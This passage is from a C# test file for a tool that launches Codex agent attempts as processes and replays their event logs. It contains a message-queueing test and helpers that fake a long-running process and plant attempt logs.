        File.Delete(shim);
        var accepted = new ConcurrentQueue<string>();
        var sender = Task.Run(async () =>
        {
            SpinWait.SpinUntil(() => runs.Latest[SayHiId].Turns is [{ Outcome: not TurnOutcome.Running }, ..], Patience);
            for (var i = 0; i < 10_000 && await runs.SendAsync(codex, $"message {i}", stopTurn: false) is SendResult.Queued; i++)
            {
                accepted.Enqueue($"message {i}");
            }
        });

        File.WriteAllText(_gate, "");

        await settled;
        await sender.WaitAsync(Patience);
        var events = AttemptLog.Read(AttemptLog.FolderOf(Path.Combine(_project, ".idp", "attempts"), SayHiId, started.Attempt.Id));
        var record = AttemptReducer.Replay(events)!;
        Assert.Equal(AttemptStatus.Failed, record.Status);
        Assert.Equal([TurnOutcome.Succeeded, TurnOutcome.Failed], record.Turns.Select(turn => turn.Outcome));
        Assert.Empty(accepted.Except(events.OfType<AttemptEvent.MessageQueued>().Select(e => e.Text)));
    }

    private static TaskDefinition SayHi(ExecutionSettings settings) =>
        TestNodes.Implement(SayHiId, "Say hi", "Create hello.txt containing hi. Then reply with DONE.", execution: settings);

    private static async Task WaitUntilAsync(Func<bool> done)
    {
        var deadline = DateTime.UtcNow + Patience;
        while (!done())
        {
            Assert.True(DateTime.UtcNow < deadline, "The condition did not become true in time.");
            await Task.Delay(20);
        }
    }

    private static bool Exited(int pid)
    {
        try
        {
            using var process = Process.GetProcessById(pid);
            return process.HasExited;
        }
        catch (ArgumentException)
        {
            return true;
        }
    }

    private static Task<AttemptRecord> NextSettled(ProjectRuns runs)
    {
        var settled = new TaskCompletionSource<AttemptRecord>(TaskCreationOptions.RunContinuationsAsynchronously);
        runs.Changed += (_, _) =>
        {
            if (runs.Latest.GetValueOrDefault(SayHiId) is { Status: not AttemptStatus.Running } record && runs.Active.IsEmpty)
            {
                settled.TrySetResult(record);
            }
        };
        return settled.Task.WaitAsync(Patience);
    }

    /// <summary>
    /// Starts a process that stays up, and returns the Launched event of a first turn that ran as exactly that process.
    /// Reconciliation stops the process if it checks that turn's process.
    /// </summary>
    private Process StartAsTheFirstTurn(out AttemptEvent.Launched launched)
    {
        var process = Process.Start(new ProcessStartInfo(_fakes.Install("sleeper", On().Hang()))
        {
            UseShellExecute = false, RedirectStandardInput = true, RedirectStandardOutput = true, RedirectStandardError = true,
        })!;
        _spawned.Add(process.Id);
        var identity = ProcessCheck.Identify(process);
        launched = new AttemptEvent.Launched(T0.AddSeconds(1), identity.Id, identity.StartedAt);
        return process;
    }

    /// <summary>Writes the log of a Codex attempt at Say hi as an earlier instance left it: its request, then <paramref name="events"/>.</summary>
    private void PlantLog(params AttemptEvent[] events)
    {
        var requested = new AttemptEvent.Requested(T0, AttemptId.New(), SayHiId, "Say hi", Settings[ClientId.Codex], "# Say hi\n", "codex", ["exec", "--json"]);
        using var log = AttemptLog.Create(Path.Combine(_project, ".idp", "attempts"), requested);
        foreach (var e in events)
        {
            log.Append(e);
        }
    }

    private string[] RecordedArguments(string file) => JsonSerializer.Deserialize<string[]>(File.ReadAllText(Evidence(file)))!;

    private string Evidence(string name) => Path.Combine(_evidence, name);
}
